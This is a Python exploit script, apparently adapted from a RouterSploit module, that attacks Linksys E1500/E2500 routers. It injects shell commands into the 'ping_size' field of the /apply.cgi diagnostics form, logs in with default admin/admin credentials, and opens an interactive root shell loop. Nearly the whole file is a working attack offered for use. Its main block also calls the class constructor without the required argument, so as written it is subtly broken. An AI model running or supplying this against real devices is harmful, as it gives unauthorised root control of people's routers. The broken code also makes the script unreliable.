target = ""
# rsf exploit module
# description: Module exploits remote command execution in Linksys E1500/E2500 devices. Diagnostics interface allows executing root privileged shell commands is available on dedicated web pages on the device.

import requests

class Exploit:
    __info__ = {
        "name": "Linksys E1500/E2500",
        "description": "Module exploits remote command execution in Linksys E1500/E2500 devices. "
                       "Diagnostics interface allows executing root privileged shell commands is "
                       "available on dedicated web pages on the device.",
        "authors": (
            "Michael Messner",  
            "Esteban Rodriguez (n00py)",  
        ),
        "references": (
            "https://www.exploit-db.com/exploits/24475/",
        ),
        "devices": (
            "Linksys E1500/E2500",
        )
    }

    def __init__(self, target, username="admin", password="admin"):
        self.target = target
        self.username = username
        self.password = password

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        data = {
            "submit_button": "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }
        response = requests.post(self.target + "/apply.cgi", data=data, auth=(self.username, self.password))
        return response.text

    def check(self):
        mark = "randomtext"
        cmd = "echo {}".format(mark)
        data = {
            "submit_button": "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }

        response = requests.post(self.target + "/apply.cgi", data=data, auth=(self.username, self.password))
        if mark in response.text:
            return True
        return False

    def shell(self):
        while True:
            cmd = input("Shell> ")
            if cmd == "exit":
                break
            result = self.execute(cmd)
            print(result)




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
